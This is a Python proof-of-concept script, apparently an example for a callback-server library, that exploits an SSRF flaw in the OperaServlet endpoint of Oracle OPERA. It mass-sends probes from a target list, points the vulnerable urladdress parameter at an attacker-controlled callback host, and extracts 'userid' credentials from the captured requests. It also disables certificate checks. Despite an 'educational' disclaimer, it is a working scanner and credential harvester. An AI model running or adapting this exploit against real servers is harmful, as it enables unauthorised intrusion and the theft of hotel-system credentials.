"""
SSRF callback detector — demonstrates using MOSS as a library.

Sends SSRF probes that mimic an OperaServlet SSRF trigger. The
correlation ID is passed and echoed in the URL path of the SSRF request.

1. Attacker starts a MOSS server with `--filter keyword --correlation 'xyz.*zyx'`

2. Attacker sends https://TARGET/OperaLogin/OperaServlet?urladdress=http://MOSS/keyword/xyz{correlation}zyx
   to the victim.

3. Victim OPERA server makes a HTTP request to http://MOSS/keyword/xyz{correlation}zyx.

4. Request is received by MOSS.

5. Event is polled and seen by the script.

NOTE: The PoC is for educational purposes only and meant to be used with mock_opera_server.py.

Usage:
    python examples/cve_2026_21967.py --lhost attacker.com --target targets.txt
    python examples/cve_2026_21967.py --lhost attacker.com --target example.com
"""

import sys
import os
import secrets
import httpx
import ssl
import argparse
import re

from moss.moss import MossBuilder


context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE
context.set_ciphers("@SECLEVEL=1:ALL") # support SSLv3


class SsrfCaptureHandler:
    """Captures incoming requests and prints SSRF-relevant details."""

    def __init__(self):
        self.callbacks = {}

    def handle_event(self, data):
        if "method" not in data:
            return

        method = data["method"]
        client = data["client"]
        ts = data["event_timestamp"]
        corr = data.get("correlation_id")
        if corr is None:
            return

        credentials = None
        body = data.get("body", b"")
        if body:
            results = re.search(r"userid=([^&]+)(?:&|$)".encode(), body)
            if results:
                credentials = results.group(1).decode()
                data["credentials"] = credentials

        self.callbacks[corr] = data
        label = credentials or "no credentials"
        print(f"  \u2190 [{ts}] {client} {method} {corr}  {label}")


# ── SSRF probe helpers ──────────────────────────────────────────────────────

def send_request(target_url, callback_url, session_id):
    """Attempt to trigger an SSRF at target.
    Returns whether the action succeeded (should not be used to indicate whether an SSRF was received)."""
    params = {
        "urladdress": f"{callback_url}/{session_id}?",
    }
    url = f"{target_url.rstrip('/')}/OperaLogin/OperaServlet"
    print(f"  \u2192 {target_url}")

    try:
        httpx.get(url, params=params, verify=context, timeout=10)
        return True
    except Exception as e:
        print(f"  \u2192 {target_url}  FAILED: {e}")
        return False


def load_targets(path):
    with open(path) as f:
        return [line.strip() for line in f if line.strip()]


def normalize_url(url):
    if "://" not in url:
        url = "https://" + url
    return url


class Formatter(argparse.RawDescriptionHelpFormatter, argparse.ArgumentDefaultsHelpFormatter):
    pass

# ── Main ────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="SSRF callback detector", formatter_class=Formatter)
    parser.add_argument("-p", "--port", type=int, default=8000, help="MOSS listen port")
    parser.add_argument("--lhost", default="127.0.0.1", metavar="HOST",
                        help="Public host for callback URL")
    parser.add_argument("--timeout", type=int, default=5,
                        help="Seconds to wait for callbacks")
    parser.add_argument("-t", "--target", required=True, action="append", metavar="URL_OR_FILE",
                        help="Target URL, bare hostname, or file of "
                             "newline-delimited URLs (repeatable)")
    args = parser.parse_args()

    if not args.target:
        parser.print_help()
        sys.exit(1)

    # Expand --target values: files -> list of URLs, everything else stays
    raw_targets = []
    for t in args.target:
        if os.path.isfile(t):
            raw_targets.extend(load_targets(t))
        else:
            raw_targets.append(t)

    if not raw_targets:
        print("No valid targets found.")
        sys.exit(1)

    # Normalize (add http:// for bare hostnames) and de-duplicate
    targets = []
    seen = set()
    for t in raw_targets:
        t = normalize_url(t)
        if t not in seen:
            seen.add(t)
            targets.append(t)

    # Unique correlation ID per target
    prefix = secrets.token_hex(2)
    suffix = secrets.token_hex(2)
    correlations = {t: prefix + secrets.token_hex(4) + suffix for t in targets}

    # ── Build MOSS server (single instance) ─────────────────────────────
    # The SSRF callback goes to {callback_url}/{prefix}{mid}{suffix}.
    # --correlation extracts the hex chars from the path to correlate which targets responded.
    # --filter limits visibility to requests containing "userid".
    moss_args = [
        "-p", str(args.port),
        "--server", "none",
        "--filter", "userid",
        "--correlation", fr"({prefix}\w{{{8}}}{suffix})",
    ]
    moss_args += ["--hostname", args.lhost]

    builder = MossBuilder(args=moss_args)
    runner = builder.api()

    runner.serve()
    server = runner.servers[0]

    capture = SsrfCaptureHandler()
    lhost = args.lhost
    default_scheme = "http"
    print(f"SSRF detector listening on {default_scheme}://{lhost}:{args.port}")
    print(f"Targeting {len(targets)} endpoint(s)")
    print()

    for t in targets:
        sid = correlations[t]
        send_request(t, f"{default_scheme}://{lhost}:{args.port}", sid)
        
        # Poll each iteration to offload events from the event queue.
        while (event := server.wait(0)) is not None:
            capture.handle_event(event)
    
    # Wait for the last SSRF (maybe) and poll one last time...
    while (event := server.wait(args.timeout)) is not None:
        capture.handle_event(event)

    print()
    print("--- Results ---")

    # Collect results, map which targets received successful SSRF out-of-band requests, and report them.
    results = []
    CLR_GRN = "\033[92m"
    CLR_RED = "\033[91m"
    CLR_RST = "\033[0m"
    for t in targets:
        corr = correlations[t]
        ssrf_req = capture.callbacks.get(corr, {})
        is_vuln = bool(ssrf_req)
        creds = ssrf_req.get("credentials") if ssrf_req else None
        results.append({
            "target": t,
            "correlation_id": corr,
            "vulnerable": is_vuln,
            "credentials": creds,
        })

        if is_vuln:
            detail = f"  credentials: {creds}" if creds else ""
            print(f"  {CLR_RED}[+] {t}{detail}{CLR_RST}")
        else:
            print(f"  {CLR_GRN}[-] {t}{CLR_RST}")

    total = len(results)
    if total > 1:
        vuln_total = sum(1 for x in results if x["vulnerable"])
        print(f"  {vuln_total}/{total} targets vulnerable")

    runner.shutdown()


if __name__ == "__main__":
    main()
